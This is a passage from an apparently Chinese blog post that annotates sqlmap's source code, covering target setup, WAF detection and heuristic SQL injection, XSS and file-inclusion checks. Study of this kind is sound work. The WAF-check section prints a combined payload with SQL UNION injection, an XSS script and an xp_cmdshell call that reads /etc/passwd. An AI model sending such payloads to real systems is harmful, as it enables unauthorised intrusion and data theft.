conf.url <span class="keyword">or</span> <span class="string">""</span>)</span><br><span class="line">    kb.customInjectionMark = match.group(<span class="number">0</span>) <span class="keyword">if</span> match <span class="keyword">else</span> CUSTOM_INJECTION_MARK_CHAR</span><br><span class="line">    <span class="comment"># INJECT_HERE_REGEX = r"(?i)%INJECT[_ ]?HERE%"</span></span><br><span class="line">    <span class="comment"># CUSTOM_INJECTION_MARK_CHAR = '*'  自定义注入标记字符</span></span><br></pre></td></tr></table></figure>

<p>里面有个写法很好  <code>kb.postUrlEncode = &quot;urlencoded&quot; in value</code>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这种写法 相当于</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"urlencoded"</span> <span class="keyword">in</span> value:</span><br><span class="line">    kb.postUrlEncode = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h5 id="setupTargetEnv-设置一些目标测试相关的环境文件等"><a href="#setupTargetEnv-设置一些目标测试相关的环境文件等" class="headerlink" title="setupTargetEnv  设置一些目标测试相关的环境文件等"></a>setupTargetEnv  设置一些目标测试相关的环境文件等</h5><p>设置目标环境信息等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setupTargetEnv</span><span class="params">()</span>:</span></span><br><span class="line">    _createTargetDirs() <span class="comment"># 创建输出的目录</span></span><br><span class="line">    _setRequestParams()</span><br><span class="line">    <span class="comment"># 检查请求参数，获取get参数 还有POST方式的附加--data的内容</span></span><br><span class="line">    <span class="comment"># 检索注入标记符并给出提示询问是否对标记点检测注入</span></span><br><span class="line">    <span class="comment"># 根据上面的注入标记法来操作</span></span><br><span class="line">    _setHashDB()</span><br><span class="line">    <span class="comment"># session.sqlite 对这个会话存储的设置和检查</span></span><br><span class="line">    _resumeHashDBValues()</span><br><span class="line">    <span class="comment"># 对session.sqlite基本历史信息的读入 数据库类型</span></span><br><span class="line">    _setResultsFile()</span><br><span class="line">    <span class="comment"># 创建保存多目标模式输出结果的文件</span></span><br><span class="line">    _setAuthCred()</span><br><span class="line">    <span class="comment"># 将当前目标的身份验证凭据（如果有）添加到密码管理器</span></span><br><span class="line">    _setAuxOptions()</span><br><span class="line">    <span class="comment"># 设置辅助（主机相关）选项</span></span><br></pre></td></tr></table></figure>

<h5 id="checkWaf"><a href="#checkWaf" class="headerlink" title="checkWaf"></a>checkWaf</h5><p>检测是否存在waf  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkWaf</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> any((conf.string, conf.notString, conf.regexp, conf.dummy, conf.offline, conf.skipWaf)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 恢复之前存储的数据 判断之前测试的时候有没有waf</span></span><br><span class="line">    _ = hashDBRetrieve(HASHDB_KEYS.CHECK_WAF_RESULT, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> _ <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> _:</span><br><span class="line">            warnMsg = <span class="string">"previous heuristics detected that the target "</span></span><br><span class="line">            warnMsg += <span class="string">"is protected by some kind of WAF/IPS"</span></span><br><span class="line">            logger.critical(warnMsg)<span class="comment"># 结束了直接 有waf</span></span><br><span class="line">        <span class="keyword">return</span> _ <span class="comment"># 否则把false返回 就是没有waf</span></span><br></pre></td></tr></table></figure>

<p><img src="images/check_if_waf.jpg" alt="check_if_waf">  </p>
<p>下面是需要检测waf的是 发了混合的paylaod 然后检测相似度（第一次会检测）<br>后面检测过了就不会走下面的检查了<br><code>checking if the target is protected by some kind of WAF/IPS</code></p>
<p>生成payload  </p>
<p><img src="images/check_waf_payload.jpg" alt="check_waf_payload">  </p>
<p>用于检测防火墙的所以有各种payload  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">u'5856 AND 1=1 UNION ALL SELECT 1,NULL,\'&lt;script&gt;alert("XSS")&lt;/script&gt;\',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(\'cat ../../../etc/passwd\')#'</span></span><br></pre></td></tr></table></figure>

<p>最后请求检测是否存在waf<br>为什么请求了一次是因为 sqlmap会直接请求然后把请求的数据存储到当前线程 threadData中<br>所以请求后直接与上一次比较就可以了  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    retVal = Request.queryPage(place=place, value=value, getRatioValue=<span class="literal">True</span>, noteResponseTime=<span class="literal">False</span>, silent=<span class="literal">True</span>, disableTampering=<span class="literal">True</span>)[<span class="number">1</span>] &lt; IDS_WAF_CHECK_RATIO</span><br><span class="line">    <span class="comment"># IDS_WAF_CHECK_RATIO = 0.5</span></span><br><span class="line">    <span class="comment"># retVal是 1.0 因为是一样的</span></span><br><span class="line">    <span class="comment"># 所以这里返回False 也就是没有waf</span></span><br><span class="line"><span class="keyword">except</span> SqlmapConnectionException:</span><br><span class="line">    retVal = <span class="literal">True</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    kb.matchRatio = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>是这个函数  Request.queryPage<br>很厉害(对payload标识符进行替换生成随机字符串 数字等 返回相似度 是否匹配特征值)</p>
<p>最终调用的是这个发起请求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page, headers, code = Connect.getPage(url=uri, get=get, post=post, method=method, cookie=cookie, ua=ua, referer=referer, host=host, silent=silent, auxHeaders=auxHeaders, response=response, raise404=raise404, ignoreTimeout=timeBasedCompare)</span><br></pre></td></tr></table></figure>

<p>测试的payload是这个</p>
<h5 id="heuristicCheckSqlInjection-启发式注入"><a href="#heuristicCheckSqlInjection-启发式注入" class="headerlink" title="heuristicCheckSqlInjection  启发式注入"></a>heuristicCheckSqlInjection  启发式注入</h5><p>启发式检测sql注入 实质是传入 单双引号等引起页面的不同反应进行测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heuristicCheckSqlInjection</span><span class="params">(place, parameter)</span>:</span></span><br><span class="line"></span><br><span class="line">    origValue = conf.paramDict[place][parameter] <span class="comment"># '1' ?id=1</span></span><br><span class="line">    paramType = conf.method <span class="keyword">if</span> conf.method <span class="keyword">not</span> <span class="keyword">in</span> (<span class="literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="keyword">else</span> place <span class="comment"># GET</span></span><br><span class="line">    <span class="comment"># 前后缀 这里的前后缀类似下面的正式注入的边界前后缀</span></span><br><span class="line">    prefix = <span class="string">""</span></span><br><span class="line">    suffix = <span class="string">""</span></span><br><span class="line">    randStr = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> conf.prefix <span class="keyword">or</span> conf.suffix: <span class="comment"># 都是空 配置的 </span></span><br><span class="line">        <span class="keyword">if</span> conf.prefix:</span><br><span class="line">            prefix = conf.prefix</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> conf.suffix:</span><br><span class="line">            suffix = conf.suffix</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> randStr.count(<span class="string">'\''</span>) != <span class="number">1</span> <span class="keyword">or</span> randStr.count(<span class="string">'\"'</span>) != <span class="number">1</span>: <span class="comment"># randStr 生成的启发式payload 单引号的个数不等于或者双引号的个数不等于1</span></span><br><span class="line">        <span class="comment"># 返回具有给定字符数的随机字符串值</span></span><br><span class="line">        <span class="comment"># 长度10 HEURISTIC_CHECK_ALPHABET</span></span><br><span class="line">        <span class="comment"># HEURISTIC_CHECK_ALPHABET = ('"', '\'', ')', '(', ',', '.') 双引号 单引号 左右括号  逗号 点</span></span><br><span class="line">        <span class="comment"># 随机生成长度为10 的 以上面的为选择的字符串</span></span><br><span class="line">        randStr = randomStr(length=<span class="number">10</span>, alphabet=HEURISTIC_CHECK_ALPHABET)</span><br><span class="line">        <span class="comment"># 例如这样 '),)\'.",(.)'</span></span><br><span class="line">    <span class="comment"># 启发式模式</span></span><br><span class="line">    kb.heuristicMode = <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 设置payload 是将前后缀与 随机字符串拼接</span></span><br><span class="line">    payload = <span class="string">"%s%s%s"</span> % (prefix, randStr, suffix)</span><br><span class="line">    <span class="comment"># 直接就是 randStr</span></span><br><span class="line">    payload = agent.payload(place, parameter, newValue=payload)</span><br><span class="line">    <span class="comment"># 合成半payload 传入 请求类型 测试的参数 上面随机的value值</span></span><br><span class="line">    <span class="comment"># u'id=__PAYLOAD_DELIMITER__1),)\'.",(.)__PAYLOAD_DELIMITER__' </span></span><br><span class="line">    <span class="comment"># id=1 等于后插入payload分隔符 1后面再加上 随机字符串 然后再payload分隔符</span></span><br><span class="line">    page, _, _ = Request.queryPage(payload, place, content=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 这里只是 u'1(("()\'.(..' 最后编码为 '1%28%28%22%28%29%27.%28..'</span></span><br><span class="line">    kb.heuristicPage = page</span><br><span class="line">    kb.heuristicMode = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    parseFilePaths(page)</span><br><span class="line">    <span class="comment"># 通过返回页面获取可能的路径 也是正则匹配</span></span><br><span class="line">    result = wasLastResponseDBMSError()</span><br><span class="line">    <span class="comment"># 页面是不是有可识别的数据库报错的匹配 有的话返回True 正则匹配页面来获取</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_</span><span class="params">(page)</span>:</span></span><br><span class="line">         <span class="comment"># 返回 正常页面没有异常字符串 但是启发式请求的返回有异常字符串</span></span><br><span class="line">         <span class="comment"># 'java.lang.NumberFormatException', 'ValueError: invalid literal', 'TypeMismatchException', 'CF_SQL_INTEGER', ' for CFSQLTYPE ', 'cfqueryparam cfsqltype', 'InvalidParamTypeException',</span></span><br><span class="line">        <span class="keyword">return</span> any(_ <span class="keyword">in</span> (page <span class="keyword">or</span> <span class="string">""</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> FORMAT_EXCEPTION_STRINGS)</span><br><span class="line"></span><br><span class="line">    casting = _(page) <span class="keyword">and</span> <span class="keyword">not</span> _(kb.originalPage) <span class="comment"># 有就True  我们这里没有就 False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里是启发式判断是否有 数据库报错获取数据库类型 代码的执行的错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> casting <span class="keyword">and</span> <span class="keyword">not</span> result <span class="keyword">and</span> kb.dynamicParameter <span class="keyword">and</span> origValue.isdigit():</span><br><span class="line">        <span class="comment"># 上面的没有报错的话走这个 </span></span><br><span class="line">        randInt = int(randomInt())</span><br><span class="line">        payload = <span class="string">"%s%s%s"</span> % (prefix, <span class="string">"%d-%d"</span> % (int(origValue) + randInt, randInt), suffix)</span><br><span class="line">        payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE)</span><br><span class="line">        result = Request.queryPage(payload, place, raise404=<span class="literal">False</span>) <span class="comment"># 比较页面是否相似</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">            <span class="comment"># 再不成的话换成字符串再请求一次</span></span><br><span class="line">            randStr = randomStr()</span><br><span class="line">            payload = <span class="string">"%s%s%s"</span> % (prefix, <span class="string">"%s.%d%s"</span> % (origValue, random.randint(<span class="number">1</span>, <span class="number">9</span>), randStr), suffix)</span><br><span class="line">            payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE)</span><br><span class="line">            casting = Request.queryPage(payload, place, raise404=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    kb.heuristicTest = HEURISTIC_TEST.CASTED <span class="keyword">if</span> casting <span class="keyword">else</span> HEURISTIC_TEST.NEGATIVE <span class="keyword">if</span> <span class="keyword">not</span> result <span class="keyword">else</span> HEURISTIC_TEST.POSITIVE</span><br><span class="line">    <span class="comment"># 根据上面是否匹配了一些异常 数据库报错异常 页面相似度来确认是否可能存在注入</span></span><br><span class="line">    <span class="keyword">elif</span> result: <span class="comment"># 这里就是从页面返回了数据库类型的报错 于是输出可能是注入的</span></span><br><span class="line">        infoMsg += <span class="string">"be injectable"</span></span><br><span class="line">        <span class="keyword">if</span> Backend.getErrorParsedDBMSes():</span><br><span class="line">            infoMsg += <span class="string">" (possible DBMS: '%s')"</span> % Format.getErrorParsedDBMSes()</span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        infoMsg += <span class="string">"not be injectable"</span></span><br><span class="line">        logger.warn(infoMsg)</span><br><span class="line"></span><br><span class="line">    kb.heuristicMode = <span class="literal">True</span> <span class="comment"># 设置启发式检测模式为 True</span></span><br><span class="line">    <span class="comment"># xss检测 就是对 '&lt;\'"&gt;'  在也没又显示匹配上了</span></span><br><span class="line">    randStr1, randStr2 = randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH), randomStr(NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH)</span><br><span class="line">    <span class="comment"># 获取两个6位的随机字符串</span></span><br><span class="line">    <span class="comment"># ('xFyTsk', 'rHcreG')</span></span><br><span class="line">    value = <span class="string">"%s%s%s"</span> % (randStr1, DUMMY_NON_SQLI_CHECK_APPENDIX, randStr2)</span><br><span class="line">    <span class="comment"># DUMMY_NON_SQLI_CHECK_APPENDIX = '&lt;\'"&gt;'   这个就可以看出来就是xss检测了</span></span><br><span class="line">    payload = <span class="string">"%s%s%s"</span> % (prefix, <span class="string">"'%s"</span> % value, suffix)</span><br><span class="line">    <span class="comment"># '\'xFyTsk&lt;\'"&gt;rHcreG'</span></span><br><span class="line">    payload = agent.payload(place, parameter, newValue=payload)</span><br><span class="line">    page, _, _ = Request.queryPage(payload, place, content=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    paramType = conf.method <span class="keyword">if</span> conf.method <span class="keyword">not</span> <span class="keyword">in</span> (<span class="literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="keyword">else</span> place</span><br><span class="line">    <span class="comment"># 存在的话就胡输出可能存在 xss  </span></span><br><span class="line">    <span class="keyword">if</span> value.lower() <span class="keyword">in</span> (page <span class="keyword">or</span> <span class="string">""</span>).lower(): <span class="comment"># 如果这个 value 还在返回的页面就可能存在xss</span></span><br><span class="line">        infoMsg = <span class="string">"heuristic (XSS) test shows that %s parameter "</span> % paramType</span><br><span class="line">        infoMsg += <span class="string">"'%s' might be vulnerable to cross-site scripting (XSS) attacks"</span> % parameter</span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line">    <span class="comment"># 还可能存在文件包含的一些特征</span></span><br><span class="line">    <span class="keyword">for</span> match <span class="keyword">in</span> re.finditer(FI_ERROR_REGEX, page <span class="keyword">or</span> <span class="string">""</span>):</span><br><span class="line">        <span class="comment"># FI_ERROR_REGEX '(?i)[^\\n]&#123;0,100&#125;(no such file|failed (to )?open)[^\\n]&#123;0,100&#125;'</span></span><br><span class="line">        <span class="comment"># 可能存在文件包含</span></span><br><span class="line">        <span class="keyword">if</span> randStr1.lower() <span class="keyword">in</span> match.group(<span class="number">0</span>).lower():</span><br><span class="line">            infoMsg = <span class="string">"heuristic (FI) test shows that %s parameter "</span> % paramType</span><br><span class="line">            infoMsg += <span class="string">"'%s' might be vulnerable to file inclusion (FI) attacks"</span> % parameter</span><br><span class="line">            logger.info(infoMsg)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    kb.heuristicMode = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kb.heuristicTest</span><br></pre></td></tr></table></figure>

<h5 id="checkSqlInjection"><a href="#checkSqlInjection" class="headerlink" title="checkSqlInjection"></a>checkSqlInjection</h5><p>正式注入检测</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span 